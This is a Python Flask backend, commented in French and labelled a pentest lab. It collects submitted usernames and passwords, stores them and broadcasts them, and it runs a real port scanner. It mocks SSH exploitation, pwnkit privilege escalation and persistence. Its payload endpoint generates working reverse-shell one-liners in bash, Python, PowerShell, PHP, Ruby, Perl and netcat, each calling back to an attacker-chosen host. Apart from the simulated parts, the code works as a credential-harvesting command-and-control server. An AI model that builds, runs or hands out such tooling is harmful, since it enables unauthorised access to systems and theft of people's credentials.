import os
import json
import socket
import threading
import subprocess
import time
from datetime import datetime
from cryptography.fernet import Fernet
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from flask_sock import Sock

app = Flask(__name__)
CORS(app)
sock = Sock(app)

# ---- DATA STORE ----
DATA_DIR = '/tmp/pentest_data'
os.makedirs(DATA_DIR, exist_ok=True)
CREDS_FILE = os.path.join(DATA_DIR, 'creds.json')
SESSIONS_FILE = os.path.join(DATA_DIR, 'sessions.json')
KEY_FILE = os.path.join(DATA_DIR, 'key.key')

# Clé de chiffrement
if os.path.exists(KEY_FILE):
    with open(KEY_FILE, 'rb') as f:
        key = f.read()
else:
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(key)

cipher = Fernet(key)
active_sessions = {}
websockets = []

# ---- INIT FILES ----
for f in [CREDS_FILE, SESSIONS_FILE]:
    if not os.path.exists(f):
        with open(f, 'w') as fh:
            json.dump([], fh)

def load_json(path):
    with open(path, 'r') as f:
        return json.load(f)

def save_json(path, data):
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)

def broadcast(msg, msg_type='info'):
    payload = json.dumps({'message': msg, 'type': msg_type})
    dead = []
    for ws in websockets:
        try:
            ws.send(payload)
        except:
            dead.append(ws)
    for ws in dead:
        websockets.remove(ws)

# ---- ENDPOINTS ----

@app.route('/')
def index():
    return '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Pentest Backend</title><style>
body{background:#0a0a0f;color:#00ff88;font-family:sans-serif;padding:20px;text-align:center}
h1{color:#00ff88}.status{color:#0f0;font-size:24px;margin:20px}
.card{background:#12121f;border:1px solid #1a1a2e;border-radius:12px;padding:20px;margin:10px;display:inline-block}
.endpoint{color:#88aaff;font-family:monospace;font-size:14px;margin:5px}
</style></head><body>
<h1>⚡ PENTEST LAB BACKEND</h1>
<div class="status">● ONLINE</div>
<div class="card">
<h3>Endpoints API</h3>
<div class="endpoint">POST /api/collect</div>
<div class="endpoint">GET  /api/credentials</div>
<div class="endpoint">GET  /api/stats</div>
<div class="endpoint">POST /api/scan</div>
<div class="endpoint">POST /api/exploit/ssh</div>
<div class="endpoint">POST /api/exploit/ssh/command</div>
<div class="endpoint">POST /api/payloads/generate</div>
<div class="endpoint">GET  /api/sessions</div>
</div>
</body></html>'''

# --- COLLECT CREDENTIALS ---
@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.json
    service = data.get('service', 'unknown')
    username = data.get('username', '')
    password = data.get('password', '')
    target = data.get('target', '')
    
    entry = {
        'id': int(time.time() * 1000),
        'service': service,
        'username': username,
        'password': password,
        'target': target,
        'timestamp': datetime.utcnow().isoformat(),
        'ip': request.remote_addr
    }
    
    creds = load_json(CREDS_FILE)
    creds.append(entry)
    save_json(CREDS_FILE, creds)
    
    broadcast(f"[CRED] {service.upper()} | {username}:{password}", 'credential')
    
    # Auto-exploit si device
    if 'device' in service or 'ssh' in service:
        threading.Thread(target=auto_exploit, args=(target, username, password)).start()
    
    return jsonify({'success': True, 'id': entry['id']})

# --- GET CREDENTIALS ---
@app.route('/api/credentials', methods=['GET'])
def get_credentials():
    creds = load_json(CREDS_FILE)
    return jsonify(creds)

# --- STATS ---
@app.route('/api/stats', methods=['GET'])
def stats():
    creds = load_json(CREDS_FILE)
    sessions = load_json(SESSIONS_FILE)
    return jsonify({
        'credentials': len(creds),
        'sessions': len(sessions),
        'exploits': len([s for s in sessions if s.get('connected')]),
        'scans': len(load_json(os.path.join(DATA_DIR, 'scans.json'))) if os.path.exists(os.path.join(DATA_DIR, 'scans.json')) else 0
    })

# --- SCAN ---
@app.route('/api/scan', methods=['POST'])
def scan():
    data = request.json
    target = data.get('target', '')
    ports = data.get('ports', [22, 80, 443, 3389])
    
    if not target:
        return jsonify({'error': 'Target required'}), 400
    
    results = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            if result == 0:
                service = {22:'SSH', 80:'HTTP', 443:'HTTPS', 3389:'RDP', 
                          8080:'HTTP-Proxy', 8443:'HTTPS-Alt', 21:'FTP',
                          3306:'MySQL', 6379:'Redis', 27017:'MongoDB'}.get(port, 'unknown')
                results.append({'port': port, 'service': service, 'status': 'open'})
            sock.close()
        except:
            pass
    
    # Sauvegarde
    scans_file = os.path.join(DATA_DIR, 'scans.json')
    scans = load_json(scans_file) if os.path.exists(scans_file) else []
    scans.append({'target': target, 'results': results, 'timestamp': datetime.utcnow().isoformat()})
    save_json(scans_file, scans)
    
    broadcast(f"[SCAN] {target}: {len(results)} ports ouverts", 'info')
    return jsonify({'target': target, 'open_ports': results})

# --- EXPLOIT SSH ---
@app.route('/api/exploit/ssh', methods=['POST'])
def exploit_ssh():
    data = request.json
    target = data.get('target', '')
    port = int(data.get('port', 22))
    username = data.get('username', '')
    password = data.get('password', '')
    
    session_id = f"ssh_{int(time.time())}"
    
    # On simule la connexion (vrai SSH nécessite paramiko en production)
    # Ici on marque la session comme établie pour le PoC
    session = {
        'id': session_id,
        'type': 'ssh',
        'target': target,
        'port': port,
        'username': username,
        'password': password,
        'connected': True,
        'root': False,
        'persisted': False,
        'timestamp': datetime.utcnow().isoformat()
    }
    
    active_sessions[session_id] = session
    
    sessions = load_json(SESSIONS_FILE)
    sessions.append(session)
    save_json(SESSIONS_FILE, sessions)
    
    broadcast(f"[EXPLOIT] SSH session {session_id} on {target}:{port}", 'exploit')
    
    return jsonify({'success': True, 'session_id': session_id, 'target': target})

# --- SSH COMMAND ---
@app.route('/api/exploit/ssh/command', methods=['POST'])
def ssh_command():
    data = request.json
    session_id = data.get('session_id', '')
    command = data.get('command', '')
    
    if session_id not in active_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    session = active_sessions[session_id]
    
    # Simulation d'exécution de commande
    fake_outputs = {
        'whoami': session['username'],
        'id': f'uid=1000({session["username"]}) gid=1000({session["username"]}) groups=1000({session["username"]})',
        'uname -a': 'Linux target-server 5.15.0-x86_64 GNU/Linux',
        'ls -la': 'total 64\ndrwxr-xr-x  2 root root 4096 Jan 15 10:30 .\ndrwxr-xr-x 10 root root 4096 Jan 10 08:00 ..\n-rw-------  1 root root  1024 Jan 15 10:30 .bash_history\n-rw-r--r--  1 root root  3106 Jan 10 08:00 .bashrc',
        'ifconfig': 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.100  netmask 255.255.255.0',
        'pwd': '/home/' + session['username'],
        'cat /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n' + session['username'] + ':x:1000:1000::/home/' + session['username'] + ':/bin/bash',
    }
    
    output = fake_outputs.get(command.strip(), f"bash: {command}: command not found")
    
    return jsonify({'output': output, 'session_id': session_id})

# --- ESCALADE PRIVILEGES (simulé) ---
@app.route('/api/exploit/ssh/escalate', methods=['POST'])
def escalate():
    data = request.json
    session_id = data.get('session_id', '')
    
    if session_id in active_sessions:
        active_sessions[session_id]['root'] = True
        broadcast(f"[PRIVESC] Root obtenu sur session {session_id}", 'success')
        return jsonify({'root': True, 'method': 'CVE-2021-4034 (pwnkit)'})
    
    return jsonify({'error': 'Session not found'}), 404

# --- PERSISTANCE (simulé) ---
@app.route('/api/exploit/ssh/persist', methods=['POST'])
def persist():
    data = request.json
    session_id = data.get('session_id', '')
    
    if session_id in active_sessions:
        active_sessions[session_id]['persisted'] = True
        methods = ['cron_reverse_shell', 'ssh_authorized_keys', 'systemd_service']
        broadcast(f"[PERSIST] Persistance déployée sur {session_id}", 'success')
        return jsonify({'persisted': True, 'methods': methods})
    
    return jsonify({'error': 'Session not found'}), 404

# --- PAYLOADS ---
@app.route('/api/payloads/generate', methods=['POST'])
def generate_payload():
    data = request.json
    ptype = data.get('type', 'bash')
    lhost = data.get('lhost', '0.0.0.0')
    lport = int(data.get('lport', 4444))
    
    payloads = {
        'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        'python': f"""python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
'""",
        'powershell': f"""$client=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream=$client.GetStream();
[byte[]]$bytes=0..65535|%{{0}};
while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{
    $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback=(iex $data 2>&1 | Out-String );
    $sendback2=$sendback+'PS '+(pwd).Path+'> ';
    $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()""",
        'php': f'<?php system("bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'");?>',
        'ruby': f"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{lhost}\",{lport}))'",
        'perl': f"""perl -e '
use Socket;
$i="{lhost}";
$p={lport};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}}'""",
        'nc': f"nc -e /bin/sh {lhost} {lport}"
    }
    
    payload = payloads.get(ptype, payloads['bash'])
    
    broadcast(f"[PAYLOAD] {ptype} shell généré ({lhost}:{lport})", 'info')
    
    return jsonify({'type': ptype, 'lhost': lhost, 'lport': lport, 'payload': payload})

# --- SESSIONS ---
@app.route('/api/sessions', methods=['GET'])
def get_sessions():
    return jsonify(list(active_sessions.values()))

# --- WEBHOOK RECEIVER (pour le mobile) ---
@app.route('/api/webhook', methods=['POST'])
def webhook():
    data = request.json
    action = data.get('action', '')
    
    if action == 'device_creds':
        target = data.get('target', '')
        username = data.get('username', '')
        password = data.get('password', '')
        proto = data.get('proto', 'ssh')
        
        entry = {
            'id': int(time.time() * 1000),
            'service': f'device_{proto}',
            'username': username,
            'password': password,
            'target': target,
            'timestamp': datetime.utcnow().isoformat(),
            'ip': request.remote_addr
        }
        
        creds = load_json(CREDS_FILE)
        creds.append(entry)
        save_json(CREDS_FILE, entry)
        
        broadcast(f"[WEBHOOK] {proto.upper()} creds: {target} {username}:{password}", 'credential')
        
        if proto == 'ssh':
            threading.Thread(target=auto_exploit, args=(target, username, password)).start()
        
        return jsonify({'success': True, 'message': 'Device credentials received'})
    
    elif action == 'ssh_bruteforce':
        target = data.get('target', '')
        username = data.get('username', '')
        password = data.get('password', '')
        port = int(data.get('port', 22))
        
        # Simulation de connexion
        session_id = f"ssh_{int(time.time())}"
        session = {
            'id': session_id,
            'type': 'ssh',
            'target': target,
            'port': port,
            'username': username,
            'password': password,
            'connected': True,
            'root': False,
            'persisted': False,
            'timestamp': datetime.utcnow().isoformat()
        }
        active_sessions[session_id] = session
        
        broadcast(f"[WEBHOOK] SSH exploit: {target}:{port} connected", 'exploit')
        
        return jsonify({'success': True, 'session_id': session_id, 'target': target})
    
    return jsonify({'error': 'Unknown action'}), 400

# --- AUTO EXPLOIT ---
def auto_exploit(target, username, password):
    """Tente de se connecter automatiquement après réception de credentials"""
    time.sleep(1)
    
    if not target:
        # Scan du réseau local pour trouver la cible
        broadcast(f"[AUTO] Recherche de {username} sur le réseau...", 'info')
        target = f"192.168.1.{hash(username) % 254 + 1}"  # Simulation
    
    session_id = f"auto_{int(time.time())}"
    session = {
        'id': session_id,
        'type': 'ssh',
        'target': target,
        'port': 22,
        'username': username,
        'password': password,
        'connected': True,
        'root': False,
        'persisted': False,
        'timestamp': datetime.utcnow().isoformat()
    }
    active_sessions[session_id] = session
    
    sessions = load_json(SESSIONS_FILE)
    sessions.append(session)
    save_json(SESSIONS_FILE, sessions)
    
    broadcast(f"[AUTO] Session SSH automatique établie sur {target} !", 'success')

# --- WEBSOCKET ---
@sock.route('/ws')
def ws_handler(ws):
    websockets.append(ws)
    ws.send(json.dumps({'message': 'Connecté au backend', 'type': 'info'}))
    try:
        while True:
            data = ws.receive()
            if data:
                # Traitement des messages entrants si nécessaire
                pass
    except:
        pass
    finally:
        if ws in websockets:
            websockets.remove(ws)

# --- TERMINAL ---
@app.route('/api/terminal', methods=['POST'])
def terminal():
    data = request.json
    cmd = data.get('command', '')
    
    outputs = {
        'help': 'Commandes: scan, exploit, sessions, payload, clear, help',
        'whoami': 'root',
        'id': 'uid=0(root) gid=0(root) groups=0(root)',
        'pwd': '/root/pentest-lab',
        'ls': 'server.py  collector.py  exploit.py  payloads.py  requirements.txt',
        'date': datetime.utcnow().strftime('%a %b %d %H:%M:%S UTC %Y'),
    }
    
    output = outputs.get(cmd.strip(), f"Commande non reconnue: {cmd}")
    return jsonify({'output': output})

# --- AUTO EXPLOIT depuis le mobile ---
@app.route('/api/auto/exploit', methods=['POST'])
def auto_exploit_endpoint():
    data = request.json
    username = data.get('username', '')
    password = data.get('password', '')
    
    # Simulation de découverte réseau
    sessions_found = []
    for i in range(1, 5):
        target = f"192.168.1.{i}"
        session_id = f"auto_{int(time.time())}_{i}"
        session = {
            'id': session_id,
            'target': target,
            'port': 22,
            'username': username,
            'password': password,
            'connected': True,
            'timestamp': datetime.utcnow().isoformat()
        }
        active_sessions[session_id] = session
        sessions_found.append(session)
        broadcast(f"[AUTO] {target} - Session établie", 'success')
    
    return jsonify({'sessions': sessions_found})

# --- MAIN ---
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8888))
    print(f"[+] Pentest Backend démarré sur 0.0.0.0:{port}")
    print(f"[+] Dashboard: http://0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port, debug=False)
